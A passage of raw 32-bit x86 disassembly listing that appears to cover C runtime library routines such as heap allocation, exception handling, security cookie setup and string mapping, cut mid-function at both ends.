  426f9c:	cmp    ebx,eax
  426f9e:	mov    DWORD PTR [ebp+0x8],ebx
  426fa1:	jb     0x426f8b
  426fa3:	cmp    ebx,eax
  426fa5:	je     0x42703f
  426fab:	mov    DWORD PTR ds:0x45df08,ebx
  426fb1:	mov    eax,DWORD PTR [ebx+0x10]
  426fb4:	mov    edx,DWORD PTR [eax]
  426fb6:	cmp    edx,0xffffffff
  426fb9:	mov    DWORD PTR [ebp-0x4],edx
  426fbc:	je     0x426fd2
  426fbe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fc5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fc9:	and    ecx,DWORD PTR [ebp-0x8]
  426fcc:	and    edi,esi
  426fce:	or     ecx,edi
  426fd0:	jne    0x427008
  426fd2:	mov    edx,DWORD PTR [eax+0xc4]
  426fd8:	and    edx,DWORD PTR [ebp-0x8]
  426fdb:	and    DWORD PTR [ebp-0x4],0x0
  426fdf:	lea    ecx,[eax+0x44]
  426fe2:	mov    esi,DWORD PTR [ecx]
  426fe4:	and    esi,DWORD PTR [ebp-0xc]
  426fe7:	or     edx,esi
  426fe9:	mov    esi,DWORD PTR [ebp-0xc]
  426fec:	jne    0x427005
  426fee:	mov    edx,DWORD PTR [ecx+0x84]
  426ff4:	and    edx,DWORD PTR [ebp-0x8]
  426ff7:	inc    DWORD PTR [ebp-0x4]
  426ffa:	add    ecx,0x4
  426ffd:	mov    edi,DWORD PTR [ecx]
  426fff:	and    edi,esi
  427001:	or     edx,edi
  427003:	je     0x426fee
  427005:	mov    edx,DWORD PTR [ebp-0x4]
  427008:	mov    ecx,edx
  42700a:	imul   ecx,ecx,0x204
  427010:	lea    ecx,[ecx+eax*1+0x144]
  427017:	mov    DWORD PTR [ebp-0xc],ecx
  42701a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42701e:	xor    edi,edi
  427020:	and    ecx,esi
  427022:	jne    0x427091
  427024:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42702b:	and    ecx,DWORD PTR [ebp-0x8]
  42702e:	push   0x20
  427030:	pop    edi
  427031:	jmp    0x427091
  427033:	cmp    DWORD PTR [ebx+0x8],0x0
  427037:	jne    0x427044
  427039:	add    ebx,0x14
  42703c:	mov    DWORD PTR [ebp+0x8],ebx
  42703f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427042:	jb     0x427033
  427044:	cmp    ebx,DWORD PTR [ebp-0x4]
  427047:	jne    0x42706f
  427049:	mov    ebx,edx
  42704b:	jmp    0x427056
  42704d:	cmp    DWORD PTR [ebx+0x8],0x0
  427051:	jne    0x42705d
  427053:	add    ebx,0x14
  427056:	cmp    ebx,eax
  427058:	mov    DWORD PTR [ebp+0x8],ebx
  42705b:	jb     0x42704d
  42705d:	cmp    ebx,eax
  42705f:	jne    0x42706f
  427061:	call   0x426a75
  427066:	mov    ebx,eax
  427068:	test   ebx,ebx
  42706a:	mov    DWORD PTR [ebp+0x8],ebx
  42706d:	je     0x427087
  42706f:	push   ebx
  427070:	call   0x426b2c
  427075:	pop    ecx
  427076:	mov    ecx,DWORD PTR [ebx+0x10]
  427079:	mov    DWORD PTR [ecx],eax
  42707b:	mov    eax,DWORD PTR [ebx+0x10]
  42707e:	cmp    DWORD PTR [eax],0xffffffff
  427081:	jne    0x426fab
  427087:	xor    eax,eax
  427089:	jmp    0x427208
  42708e:	shl    ecx,1
  427090:	inc    edi
  427091:	test   ecx,ecx
  427093:	jge    0x42708e
  427095:	mov    ecx,DWORD PTR [ebp-0xc]
  427098:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42709c:	mov    ecx,DWORD PTR [edx]
  42709e:	sub    ecx,DWORD PTR [ebp-0x10]
  4270a1:	mov    esi,ecx
  4270a3:	sar    esi,0x4
  4270a6:	dec    esi
  4270a7:	cmp    esi,0x3f
  4270aa:	mov    DWORD PTR [ebp-0x8],ecx
  4270ad:	jle    0x4270b2
  4270af:	push   0x3f
  4270b1:	pop    esi
  4270b2:	cmp    esi,edi
  4270b4:	je     0x4271bb
  4270ba:	mov    ecx,DWORD PTR [edx+0x4]
  4270bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4270c0:	jne    0x42711e
  4270c2:	cmp    edi,0x20
  4270c5:	mov    ebx,0x80000000
  4270ca:	jge    0x4270f2
  4270cc:	mov    ecx,edi
  4270ce:	shr    ebx,cl
  4270d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270d3:	lea    edi,[eax+edi*1+0x4]
  4270d7:	not    ebx
  4270d9:	mov    DWORD PTR [ebp-0x14],ebx
  4270dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270e4:	dec    BYTE PTR [edi]
  4270e6:	jne    0x42711b
  4270e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4270ee:	and    DWORD PTR [ebx],ecx
  4270f0:	jmp    0x42711e
  4270f2:	lea    ecx,[edi-0x20]
  4270f5:	shr    ebx,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270fa:	lea    ecx,[eax+ecx*4+0xc4]
  427101:	lea    edi,[eax+edi*1+0x4]
  427105:	not    ebx
  427107:	and    DWORD PTR [ecx],ebx
  427109:	dec    BYTE PTR [edi]
  42710b:	mov    DWORD PTR [ebp-0x14],ebx
  42710e:	jne    0x42711b
  427110:	mov    ebx,DWORD PTR [ebp+0x8]
  427113:	mov    ecx,DWORD PTR [ebp-0x14]
  427116:	and    DWORD PTR [ebx+0x4],ecx
  427119:	jmp    0x42711e
  42711b:	mov    ebx,DWORD PTR [ebp+0x8]
  42711e:	cmp    DWORD PTR [ebp-0x8],0x0
  427122:	mov    ecx,DWORD PTR [edx+0x8]
  427125:	mov    edi,DWORD PTR [edx+0x4]
  427128:	mov    DWORD PTR [ecx+0x4],edi
  42712b:	mov    ecx,DWORD PTR [edx+0x4]
  42712e:	mov    edi,DWORD PTR [edx+0x8]
  427131:	mov    DWORD PTR [ecx+0x8],edi
  427134:	je     0x4271c7
  42713a:	mov    ecx,DWORD PTR [ebp-0xc]
  42713d:	lea    ecx,[ecx+esi*8]
  427140:	mov    edi,DWORD PTR [ecx+0x4]
  427143:	mov    DWORD PTR [edx+0x8],ecx
  427146:	mov    DWORD PTR [edx+0x4],edi
  427149:	mov    DWORD PTR [ecx+0x4],edx
  42714c:	mov    ecx,DWORD PTR [edx+0x4]
  42714f:	mov    DWORD PTR [ecx+0x8],edx
  427152:	mov    ecx,DWORD PTR [edx+0x4]
  427155:	cmp    ecx,DWORD PTR [edx+0x8]
  427158:	jne    0x4271b8
  42715a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42715e:	mov    BYTE PTR [ebp+0xb],cl
  427161:	inc    cl
  427163:	cmp    esi,0x20
  427166:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42716a:	jge    0x42718f
  42716c:	cmp    BYTE PTR [ebp+0xb],0x0
  427170:	jne    0x42717d
  427172:	mov    edi,0x80000000
  427177:	mov    ecx,esi
  427179:	shr    edi,cl
  42717b:	or     DWORD PTR [ebx],edi
  42717d:	mov    ecx,esi
  42717f:	mov    edi,0x80000000
  427184:	shr    edi,cl
  427186:	mov    ecx,DWORD PTR [ebp-0x4]
  427189:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42718d:	jmp    0x4271b8
  42718f:	cmp    BYTE PTR [ebp+0xb],0x0
  427193:	jne    0x4271a2
  427195:	lea    ecx,[esi-0x20]
  427198:	mov    edi,0x80000000
  42719d:	shr    edi,cl
  42719f:	or     DWORD PTR [ebx+0x4],edi
  4271a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4271a5:	lea    edi,[eax+ecx*4+0xc4]
  4271ac:	lea    ecx,[esi-0x20]
  4271af:	mov    esi,0x80000000
  4271b4:	shr    esi,cl
  4271b6:	or     DWORD PTR [edi],esi
  4271b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271bb:	test   ecx,ecx
  4271bd:	je     0x4271ca
  4271bf:	mov    DWORD PTR [edx],ecx
  4271c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271c5:	jmp    0x4271ca
  4271c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ca:	mov    esi,DWORD PTR [ebp-0x10]
  4271cd:	add    edx,ecx
  4271cf:	lea    ecx,[esi+0x1]
  4271d2:	mov    DWORD PTR [edx],ecx
  4271d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271d8:	mov    esi,DWORD PTR [ebp-0xc]
  4271db:	mov    ecx,DWORD PTR [esi]
  4271dd:	test   ecx,ecx
  4271df:	lea    edi,[ecx+0x1]
  4271e2:	mov    DWORD PTR [esi],edi
  4271e4:	jne    0x427200
  4271e6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271ec:	jne    0x427200
  4271ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271f7:	jne    0x427200
  4271f9:	and    DWORD PTR ds:0x45def8,0x0
  427200:	mov    ecx,DWORD PTR [ebp-0x4]
  427203:	mov    DWORD PTR [eax],ecx
  427205:	lea    eax,[edx+0x4]
  427208:	pop    edi
  427209:	pop    esi
  42720a:	pop    ebx
  42720b:	leave  
  42720c:	ret    
  42720d:	int3   
  42720e:	int3   
  42720f:	int3   
  427210:	push   esi
  427211:	inc    ebx
  427212:	xor    dh,BYTE PTR [eax]
  427214:	pop    eax
  427215:	inc    ebx
  427216:	xor    BYTE PTR [eax],dh
  427218:	push   ebp
  427219:	mov    ebp,esp
  42721b:	sub    esp,0x8
  42721e:	push   ebx
  42721f:	push   esi
  427220:	push   edi
  427221:	push   ebp
  427222:	cld    
  427223:	mov    ebx,DWORD PTR [ebp+0xc]
  427226:	mov    eax,DWORD PTR [ebp+0x8]
  427229:	test   DWORD PTR [eax+0x4],0x6
  427230:	jne    0x4272b8
  427236:	mov    DWORD PTR [ebp-0x8],eax
  427239:	mov    eax,DWORD PTR [ebp+0x10]
  42723c:	mov    DWORD PTR [ebp-0x4],eax
  42723f:	lea    eax,[ebp-0x8]
  427242:	mov    DWORD PTR [ebx-0x4],eax
  427245:	mov    esi,DWORD PTR [ebx+0xc]
  427248:	mov    edi,DWORD PTR [ebx+0x8]
  42724b:	cmp    esi,0xffffffff
  42724e:	je     0x4272b1
  427250:	lea    ecx,[esi+esi*2]
  427253:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427258:	je     0x42729f
  42725a:	push   esi
  42725b:	push   ebp
  42725c:	lea    ebp,[ebx+0x10]
  42725f:	call   DWORD PTR [edi+ecx*4+0x4]
  427263:	pop    ebp
  427264:	pop    esi
  427265:	mov    ebx,DWORD PTR [ebp+0xc]
  427268:	or     eax,eax
  42726a:	je     0x42729f
  42726c:	js     0x4272aa
  42726e:	mov    edi,DWORD PTR [ebx+0x8]
  427271:	push   ebx
  427272:	call   0x4281a0
  427277:	add    esp,0x4
  42727a:	lea    ebp,[ebx+0x10]
  42727d:	push   esi
  42727e:	push   ebx
  42727f:	call   0x4281e2
  427284:	add    esp,0x8
  427287:	lea    ecx,[esi+esi*2]
  42728a:	push   0x1
  42728c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427290:	call   0x428276
  427295:	mov    eax,DWORD PTR [edi+ecx*4]
  427298:	mov    DWORD PTR [ebx+0xc],eax
  42729b:	call   DWORD PTR [edi+ecx*4+0x8]
  42729f:	mov    edi,DWORD PTR [ebx+0x8]
  4272a2:	lea    ecx,[esi+esi*2]
  4272a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4272a8:	jmp    0x42724b
  4272aa:	mov    eax,0x0
  4272af:	jmp    0x4272cd
  4272b1:	mov    eax,0x1
  4272b6:	jmp    0x4272cd
  4272b8:	push   ebp
  4272b9:	lea    ebp,[ebx+0x10]
  4272bc:	push   0xffffffff
  4272be:	push   ebx
  4272bf:	call   0x4281e2
  4272c4:	add    esp,0x8
  4272c7:	pop    ebp
  4272c8:	mov    eax,0x1
  4272cd:	pop    ebp
  4272ce:	pop    edi
  4272cf:	pop    esi
  4272d0:	pop    ebx
  4272d1:	mov    esp,ebp
  4272d3:	pop    ebp
  4272d4:	ret    
  4272d5:	push   ebp
  4272d6:	mov    ecx,DWORD PTR [esp+0x8]
  4272da:	mov    ebp,DWORD PTR [ecx]
  4272dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272df:	push   eax
  4272e0:	mov    eax,DWORD PTR [ecx+0x18]
  4272e3:	push   eax
  4272e4:	call   0x4281e2
  4272e9:	add    esp,0x8
  4272ec:	pop    ebp
  4272ed:	ret    0x4
  4272f0:	call   0x425203
  4272f5:	add    eax,0x8
  4272f8:	ret    
  4272f9:	push   0x14
  4272fb:	push   0x429880
  427300:	call   0x425350
  427305:	mov    edi,DWORD PTR [ebp+0x8]
  427308:	xor    ebx,ebx
  42730a:	cmp    edi,ebx
  42730c:	jne    0x42731c
  42730e:	push   DWORD PTR [ebp+0xc]
  427311:	call   0x426072
  427316:	pop    ecx
  427317:	jmp    0x4274a0
  42731c:	mov    esi,DWORD PTR [ebp+0xc]
  42731f:	cmp    esi,ebx
  427321:	jne    0x42732f
  427323:	push   edi
  427324:	call   0x425f5a
  427329:	pop    ecx
  42732a:	jmp    0x42749e
  42732f:	cmp    DWORD PTR ds:0x45e144,0x3
  427336:	jne    0x42746a
  42733c:	mov    DWORD PTR [ebp-0x1c],ebx
  42733f:	cmp    esi,0xffffffe0
  427342:	ja     0x427439
  427348:	push   0x4
  42734a:	call   0x42550f
  42734f:	pop    ecx
  427350:	mov    DWORD PTR [ebp-0x4],ebx
  427353:	push   edi
  427354:	call   0x426732
  427359:	pop    ecx
  42735a:	mov    DWORD PTR [ebp-0x20],eax
  42735d:	cmp    eax,ebx
  42735f:	je     0x427409
  427365:	cmp    esi,DWORD PTR ds:0x45df04
  42736b:	ja     0x4273b9
  42736d:	push   esi
  42736e:	push   edi
  42736f:	push   eax
  427370:	call   0x426c32
  427375:	add    esp,0xc
  427378:	test   eax,eax
  42737a:	je     0x427381
  42737c:	mov    DWORD PTR [ebp-0x1c],edi
  42737f:	jmp    0x4273b9
  427381:	push   esi
  427382:	call   0x426f11
  427387:	pop    ecx
  427388:	mov    DWORD PTR [ebp-0x1c],eax
  42738b:	cmp    eax,ebx
  42738d:	je     0x4273b9
  42738f:	mov    eax,DWORD PTR [edi-0x4]
  427392:	dec    eax
  427393:	mov    DWORD PTR [ebp-0x24],eax
  427396:	cmp    eax,esi
  427398:	jb     0x42739c
  42739a:	mov    eax,esi
  42739c:	push   eax
  42739d:	push   edi
  42739e:	push   DWORD PTR [ebp-0x1c]
  4273a1:	call   0x426090
  4273a6:	push   edi
  4273a7:	call   0x426732
  4273ac:	mov    DWORD PTR [ebp-0x20],eax
  4273af:	push   edi
  4273b0:	push   eax
  4273b1:	call   0x42675d
  4273b6:	add    esp,0x18
  4273b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273bc:	jne    0x427409
  4273be:	cmp    esi,ebx
  4273c0:	jne    0x4273c8
  4273c2:	xor    esi,esi
  4273c4:	inc    esi
  4273c5:	mov    DWORD PTR [ebp+0xc],esi
  4273c8:	add    esi,0xf
  4273cb:	and    esi,0xfffffff0
  4273ce:	mov    DWORD PTR [ebp+0xc],esi
  4273d1:	push   esi
  4273d2:	push   ebx
  4273d3:	push   DWORD PTR ds:0x45e140
  4273d9:	call   DWORD PTR ds:0x429030
  4273df:	mov    DWORD PTR [ebp-0x1c],eax
  4273e2:	cmp    eax,ebx
  4273e4:	je     0x427409
  4273e6:	mov    eax,DWORD PTR [edi-0x4]
  4273e9:	dec    eax
  4273ea:	mov    DWORD PTR [ebp-0x24],eax
  4273ed:	cmp    eax,esi
  4273ef:	jb     0x4273f3
  4273f1:	mov    eax,esi
  4273f3:	push   eax
  4273f4:	push   edi
  4273f5:	push   DWORD PTR [ebp-0x1c]
  4273f8:	call   0x426090
  4273fd:	push   edi
  4273fe:	push   DWORD PTR [ebp-0x20]
  427401:	call   0x42675d
  427406:	add    esp,0x14
  427409:	or     DWORD PTR [ebp-0x4],0xffffffff
  42740d:	call   0x427461
  427412:	cmp    DWORD PTR [ebp-0x20],ebx
  427415:	jne    0x427439
  427417:	cmp    esi,ebx
  427419:	jne    0x42741e
  42741b:	xor    esi,esi
  42741d:	inc    esi
  42741e:	add    esi,0xf
  427421:	and    esi,0xfffffff0
  427424:	mov    DWORD PTR [ebp+0xc],esi
  427427:	push   esi
  427428:	push   edi
  427429:	push   ebx
  42742a:	push   DWORD PTR ds:0x45e140
  427430:	call   DWORD PTR ds:0x4290d4
  427436:	mov    DWORD PTR [ebp-0x1c],eax
  427439:	mov    eax,DWORD PTR [ebp-0x1c]
  42743c:	cmp    eax,ebx
  42743e:	jne    0x4274a0
  427440:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427446:	je     0x4274a0
  427448:	push   esi
  427449:	call   0x427c32
  42744e:	pop    ecx
  42744f:	test   eax,eax
  427451:	jne    0x42733c
  427457:	jmp    0x42749e
  427459:	xor    ebx,ebx
  42745b:	mov    esi,DWORD PTR [ebp+0xc]
  42745e:	mov    edi,DWORD PTR [ebp+0x8]
  427461:	push   0x4
  427463:	call   0x42547b
  427468:	pop    ecx
  427469:	ret    
  42746a:	xor    eax,eax
  42746c:	cmp    esi,0xffffffe0
  42746f:	ja     0x427487
  427471:	cmp    esi,ebx
  427473:	jne    0x427478
  427475:	xor    esi,esi
  427477:	inc    esi
  427478:	push   esi
  427479:	push   edi
  42747a:	push   ebx
  42747b:	push   DWORD PTR ds:0x45e140
  427481:	call   DWORD PTR ds:0x4290d4
  427487:	cmp    eax,ebx
  427489:	jne    0x4274a0
  42748b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427491:	je     0x4274a0
  427493:	push   esi
  427494:	call   0x427c32
  427499:	pop    ecx
  42749a:	test   eax,eax
  42749c:	jne    0x42746a
  42749e:	xor    eax,eax
  4274a0:	call   0x42538b
  4274a5:	ret    
  4274a6:	push   0x10
  4274a8:	push   0x429890
  4274ad:	call   0x425350
  4274b2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274b9:	jne    0x4274f5
  4274bb:	push   0x4
  4274bd:	call   0x42550f
  4274c2:	pop    ecx
  4274c3:	and    DWORD PTR [ebp-0x4],0x0
  4274c7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ca:	push   esi
  4274cb:	call   0x426732
  4274d0:	pop    ecx
  4274d1:	mov    DWORD PTR [ebp-0x1c],eax
  4274d4:	test   eax,eax
  4274d6:	je     0x4274e3
  4274d8:	mov    esi,DWORD PTR [esi-0x4]
  4274db:	sub    esi,0x9
  4274de:	mov    DWORD PTR [ebp-0x20],esi
  4274e1:	jmp    0x4274e6
  4274e3:	mov    esi,DWORD PTR [ebp-0x20]
  4274e6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ea:	call   0x427513
  4274ef:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274f3:	jne    0x427508
  4274f5:	push   DWORD PTR [ebp+0x8]
  4274f8:	push   0x0
  4274fa:	push   DWORD PTR ds:0x45e140
  427500:	call   DWORD PTR ds:0x4290d8
  427506:	mov    esi,eax
  427508:	mov    eax,esi
  42750a:	call   0x42538b
  42750f:	ret    
  427510:	mov    esi,DWORD PTR [ebp-0x20]
  427513:	push   0x4
  427515:	call   0x42547b
  42751a:	pop    ecx
  42751b:	ret    
  42751c:	push   ebp
  42751d:	mov    ebp,esp
  42751f:	sub    esp,0x10
  427522:	push   esi
  427523:	lea    eax,[ebp-0x8]
  427526:	push   eax
  427527:	call   DWORD PTR ds:0x4290e8
  42752d:	mov    esi,DWORD PTR [ebp-0x4]
  427530:	xor    esi,DWORD PTR [ebp-0x8]
  427533:	call   DWORD PTR ds:0x4290e4
  427539:	xor    esi,eax
  42753b:	call   DWORD PTR ds:0x42909c
  427541:	xor    esi,eax
  427543:	call   DWORD PTR ds:0x4290e0
  427549:	xor    esi,eax
  42754b:	lea    eax,[ebp-0x10]
  42754e:	push   eax
  42754f:	call   DWORD PTR ds:0x4290dc
  427555:	mov    eax,DWORD PTR [ebp-0xc]
  427558:	xor    eax,DWORD PTR [ebp-0x10]
  42755b:	xor    esi,eax
  42755d:	mov    DWORD PTR ds:0x45d430,esi
  427563:	jne    0x42756f
  427565:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42756f:	pop    esi
  427570:	leave  
  427571:	ret    
  427572:	push   0x118
  427577:	push   0x429a40
  42757c:	call   0x425350
  427581:	mov    eax,ds:0x45d430
  427586:	xor    eax,DWORD PTR [ebp+0x4]
  427589:	mov    DWORD PTR [ebp-0x1c],eax
  42758c:	mov    eax,ds:0x45dd98
  427591:	xor    ecx,ecx
  427593:	cmp    eax,ecx
  427595:	je     0x4275b6
  427597:	mov    DWORD PTR [ebp-0x4],ecx
  42759a:	push   DWORD PTR [ebp+0xc]
  42759d:	push   DWORD PTR [ebp+0x8]
  4275a0:	call   eax
  4275a2:	pop    ecx
  4275a3:	pop    ecx
  4275a4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275a8:	jmp    0x4276b4
  4275ad:	xor    eax,eax
  4275af:	inc    eax
  4275b0:	ret    
  4275b1:	mov    esp,DWORD PTR [ebp-0x18]
  4275b4:	jmp    0x4275a4
  4275b6:	mov    eax,DWORD PTR [ebp+0x8]
  4275b9:	dec    eax
  4275ba:	je     0x4275cf
  4275bc:	mov    edi,0x429a1c
  4275c1:	mov    DWORD PTR [ebp-0x20],0x429968
  4275c8:	mov    esi,0xd4
  4275cd:	jmp    0x4275e0
  4275cf:	mov    edi,0x429948
  4275d4:	mov    DWORD PTR [ebp-0x20],0x4298a8
  4275db:	mov    esi,0xb9
  4275e0:	mov    BYTE PTR [ebp-0x24],cl
  4275e3:	push   0x104
  4275e8:	lea    eax,[ebp-0x128]
  4275ee:	push   eax
  4275ef:	push   ecx
  4275f0:	call   DWORD PTR ds:0x42906c
  4275f6:	test   eax,eax
  4275f8:	jne    0x42760d
  4275fa:	push   0x42959c
  4275ff:	lea    eax,[ebp-0x128]
  427605:	push   eax
  427606:	call   0x425730
  42760b:	pop    ecx
  42760c:	pop    ecx
  42760d:	lea    ebx,[ebp-0x128]
  427613:	lea    eax,[ebp-0x128]
  427619:	push   eax
  42761a:	call   0x425960
  42761f:	pop    ecx
  427620:	add    eax,0xb
  427623:	cmp    eax,0x3c
  427626:	jbe    0x427651
  427628:	lea    eax,[ebp-0x128]
  42762e:	push   eax
  42762f:	call   0x425960
  427634:	mov    ebx,eax
  427636:	lea    eax,[ebp-0x128]
  42763c:	sub    eax,0x31
  42763f:	add    ebx,eax
  427641:	push   0x3
  427643:	push   0x429598
  427648:	push   ebx
  427649:	call   0x425830
  42764e:	add    esp,0x10
  427651:	push   ebx
  427652:	call   0x425960
  427657:	pop    ecx
  427658:	lea    eax,[eax+esi*1+0xc]
  42765c:	add    eax,0x3
  42765f:	and    eax,0xfffffffc
  427662:	call   0x4253a0
  427667:	mov    DWORD PTR [ebp-0x18],esp
  42766a:	mov    esi,esp
  42766c:	push   edi
  42766d:	push   esi
  42766e:	call   0x425730
  427673:	mov    edi,0x429578
  427678:	push   edi
  427679:	push   esi
  42767a:	call   0x425740
  42767f:	push   0x42989c
  427684:	push   esi
  427685:	call   0x425740
  42768a:	push   ebx
  42768b:	push   esi
  42768c:	call   0x425740
  427691:	push   edi
  427692:	push   esi
  427693:	call   0x425740
  427698:	push   DWORD PTR [ebp-0x20]
  42769b:	push   esi
  42769c:	call   0x425740
  4276a1:	push   0x12010
  4276a6:	push   0x429550
  4276ab:	push   esi
  4276ac:	call   0x425632
  4276b1:	add    esp,0x3c
  4276b4:	push   0x3
  4276b6:	call   0x4247bc
  4276bb:	int3   
  4276bc:	push   0x38
  4276be:	push   0x429e60
  4276c3:	call   0x425350
  4276c8:	xor    ebx,ebx
  4276ca:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276d0:	jne    0x42770a
  4276d2:	push   ebx
  4276d3:	push   ebx
  4276d4:	xor    esi,esi
  4276d6:	inc    esi
  4276d7:	push   esi
  4276d8:	push   0x429e5c
  4276dd:	push   0x100
  4276e2:	push   ebx
  4276e3:	call   DWORD PTR ds:0x4290f4
  4276e9:	test   eax,eax
  4276eb:	je     0x4276f5
  4276ed:	mov    DWORD PTR ds:0x45ddbc,esi
  4276f3:	jmp    0x42770a
  4276f5:	call   DWORD PTR ds:0x429028
  4276fb:	cmp    eax,0x78
  4276fe:	jne    0x42770a
  427700:	mov    DWORD PTR ds:0x45ddbc,0x2
  42770a:	cmp    DWORD PTR [ebp+0x14],ebx
  42770d:	jle    0x42772a
  42770f:	mov    ecx,DWORD PTR [ebp+0x14]
  427712:	mov    eax,DWORD PTR [ebp+0x10]
  427715:	dec    ecx
  427716:	cmp    BYTE PTR [eax],bl
  427718:	je     0x427722
  42771a:	inc    eax
  42771b:	cmp    ecx,ebx
  42771d:	jne    0x427715
  42771f:	or     ecx,0xffffffff
  427722:	or     eax,0xffffffff
  427725:	sub    eax,ecx
  427727:	add    DWORD PTR [ebp+0x14],eax
  42772a:	mov    eax,ds:0x45ddbc
  42772f:	cmp    eax,0x2
  427732:	je     0x427914
  427738:	cmp    eax,ebx
  42773a:	je     0x427914
  427740:	cmp    eax,0x1
  427743:	jne    0x427947
  427749:	xor    edi,edi
  42774b:	mov    DWORD PTR [ebp-0x1c],edi
  42774e:	mov    DWORD PTR [ebp-0x20],ebx
  427751:	mov    DWORD PTR [ebp-0x24],ebx
  427754:	cmp    DWORD PTR [ebp+0x20],ebx
  427757:	jne    0x427761
  427759:	mov    eax,ds:0x45ddb4
  42775e:	mov    DWORD PTR [ebp+0x20],eax
  427761:	push   ebx
  427762:	push   ebx
  427763:	push   DWORD PTR [ebp+0x14]
  427766:	push   DWORD PTR [ebp+0x10]
  427769:	xor    eax,eax
  42776b:	cmp    DWORD PTR [ebp+0x24],ebx
  42776e:	setne  al
  427771:	lea    eax,[eax*8+0x1]
  427778:	push   eax
  427779:	push   DWORD PTR [ebp+0x20]
  42777c:	call   DWORD PTR ds:0x4290f0
  427782:	mov    esi,eax
  427784:	mov    DWORD PTR [ebp-0x28],esi
  427787:	cmp    esi,ebx
  427789:	je     0x427947
  42778f:	mov    DWORD PTR [ebp-0x4],0x1
  427796:	lea    eax,[esi+esi*1]
  427799:	add    eax,0x3
  42779c:	and    eax,0xfffffffc
  42779f:	call   0x4253a0
  4277a4:	mov    DWORD PTR [ebp-0x18],esp
  4277a7:	mov    eax,esp
  4277a9:	mov    DWORD PTR [ebp-0x2c],eax
  4277ac:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b0:	jmp    0x4277cd
  4277b2:	xor    eax,eax
  4277b4:	inc    eax
  4277b5:	ret    
  4277b6:	mov    esp,DWORD PTR [ebp-0x18]
  4277b9:	call   0x4287e5
  4277be:	xor    ebx,ebx
  4277c0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277c3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277c7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ca:	mov    esi,DWORD PTR [ebp-0x28]
  4277cd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277d0:	jne    0x4277ee
  4277d2:	lea    eax,[esi+esi*1]
  4277d5:	push   eax
  4277d6:	call   0x426072
  4277db:	pop    ecx
  4277dc:	mov    DWORD PTR [ebp-0x2c],eax
  4277df:	cmp    eax,ebx
  4277e1:	je     0x427947
  4277e7:	mov    DWORD PTR [ebp-0x20],0x1
  4277ee:	push   esi
  4277ef:	push   DWORD PTR [ebp-0x2c]
  4277f2:	push   DWORD PTR [ebp+0x14]
  4277f5:	push   DWORD PTR [ebp+0x10]
  4277f8:	push   0x1
  4277fa:	push   DWORD PTR [ebp+0x20]
  4277fd:	call   DWORD PTR ds:0x4290f0
  427803:	test   eax,eax
  427805:	je     0x4278f1
  42780b:	push   ebx
  42780c:	push   ebx
  42780d:	push   esi
  42780e:	push   DWORD PTR [ebp-0x2c]
  427811:	push   DWORD PTR [ebp+0xc]
  427814:	push   DWORD PTR [ebp+0x8]
  427817:	call   DWORD PTR ds:0x4290f4
  42781d:	mov    edi,eax
  42781f:	mov    DWORD PTR [ebp-0x1c],edi
  427822:	cmp    edi,ebx
  427824:	je     0x4278f1
  42782a:	test   BYTE PTR [ebp+0xd],0x4
  42782e:	je     0x42785d
  427830:	cmp    DWORD PTR [ebp+0x1c],ebx
  427833:	je     0x4278f1
  427839:	cmp    edi,DWORD PTR [ebp+0x1c]
  42783c:	jg     0x4278f1
  427842:	push   DWORD PTR [ebp+0x1c]
  427845:	push   DWORD PTR [ebp+0x18]
  427848:	push   esi
  427849:	push   DWORD PTR [ebp-0x2c]
  42784c:	push   DWORD PTR [ebp+0xc]
  42784f:	push   DWORD PTR [ebp+0x8]
  427852:	call   DWORD PTR ds:0x4290f4
  427858:	jmp    0x4278f1
  42785d:	mov    DWORD PTR [ebp-0x4],0x2
  427864:	lea    eax,[edi+edi*1]
  427867:	add    eax,0x3
  42786a:	and    eax,0xfffffffc
  42786d:	call   0x4253a0
  427872:	mov    DWORD PTR [ebp-0x18],esp
  427875:	mov    eax,esp
  427877:	mov    DWORD PTR [ebp-0x30],eax
  42787a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42787e:	jmp    0x42789b
  427880:	xor    eax,eax
  427882:	inc    eax
  427883:	ret    
  427884:	mov    esp,DWORD PTR [ebp-0x18]
  427887:	call   0x4287e5
  42788c:	xor    ebx,ebx
